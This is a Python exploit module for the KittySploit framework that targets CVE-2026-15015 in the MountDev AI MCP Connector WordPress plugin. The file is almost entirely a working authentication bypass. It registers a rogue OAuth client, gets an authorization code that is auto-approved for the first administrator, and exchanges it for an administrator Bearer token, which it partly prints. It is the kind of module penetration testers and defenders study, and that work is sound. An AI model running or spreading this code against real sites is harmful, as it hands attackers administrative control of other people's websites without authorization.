#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MountDev MCP Connector CVE-2026-15015 — unauthenticated admin OAuth token."""

import json
import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "MountDev MCP CVE-2026-15015 admin OAuth token",
        "description": (
            "Registers an OAuth client via /mcp-register, auto-approves authorize as the "
            "first administrator, exchanges code at /mcp-token for Bearer access."
        ),
        "author": ["KittySploit Team"],
        "cve": ["CVE-2026-15015"],
        "tags": [
            "auxiliary", "wordpress", "oauth", "mcp", "auth-bypass", "cve-2026-15015"],
        "agent": {
            "approval_required": True,
            "produces": ["credentials", "risk_signals"],
        },
    }

    path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _site_root(self) -> str:
        def opt(name, default):
            o = getattr(self, name, None)
            if o is None:
                return default
            return o.value if hasattr(o, "value") else o

        from lib.scanner.target_utils import normalize_scanner_target

        host, url_port, url_ssl = normalize_scanner_target(str(opt("target", "") or ""))
        host = host or str(opt("target", "localhost"))
        port = int(url_port if url_port is not None else opt("port", 443))
        ssl = url_ssl if url_ssl is not None else bool(opt("ssl", True))
        proto = "https" if ssl or port == 443 else "http"
        if (proto == "https" and port == 443) or (proto == "http" and port == 80):
            return f"{proto}://{host}/"
        return f"{proto}://{host}:{port}/"

    def run(self):
        root = self._site_root().rstrip("/")
        reg = self.http_request(
            method="POST",
            path=self._join("/mcp-register"),
            headers={"Content-Type": "application/json"},
            data=json.dumps(
                {
                    "redirect_uris": [root],
                    "client_name": f"kitty{secrets.token_hex(3)}",
                    "token_endpoint_auth_method": "client_secret_post",
                }
            ),
            allow_redirects=False,
        )
        if not reg or int(reg.status_code or 0) not in (200, 201):
            print_error("mcp-register failed")
            return False
        body = reg.text or ""
        cid_m = re.search(r'"client_id"\s*:\s*"([^"]+)"', body)
        sec_m = re.search(r'"client_secret"\s*:\s*"([^"]+)"', body)
        if not cid_m or not sec_m:
            print_error("client_id/client_secret missing")
            return False
        client_id, client_secret = cid_m.group(1), sec_m.group(1)
        auth = self.http_request(
            method="GET",
            path=self._join("/wp-json/mountdev-ai-mcp-connector/v1/oauth/authorize"),
            params={
                "client_id": client_id,
                "redirect_uri": root,
                "response_type": "code",
                "scope": "mcp",
            },
            allow_redirects=False,
        )
        loc = auth.headers.get("Location") or "" if auth else ""
        code_m = re.search(r"code=([a-zA-Z0-9]+)", loc)
        if not code_m:
            print_error("Authorization code not returned")
            return False
        tok = self.http_request(
            method="POST",
            path=self._join("/mcp-token"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "grant_type": "authorization_code",
                "code": code_m.group(1),
                "client_id": client_id,
                "client_secret": client_secret,
            },
            allow_redirects=False,
        )
        if not tok or int(tok.status_code or 0) != 200:
            print_error("Token exchange failed")
            return False
        try:
            payload = json.loads(tok.text or "{}")
        except json.JSONDecodeError:
            print_error("Invalid token JSON")
            return False
        token = payload.get("access_token") or ""
        if not token:
            print_error("access_token empty")
            return False
        print_success("Administrator-bound OAuth access_token obtained")
        print_status(f"Bearer {token[:48]}...")
        print_status(f"client_id={client_id}")
        self.set_info(severity="critical", cve="CVE-2026-15015", reason="MCP admin OAuth token")
        return True
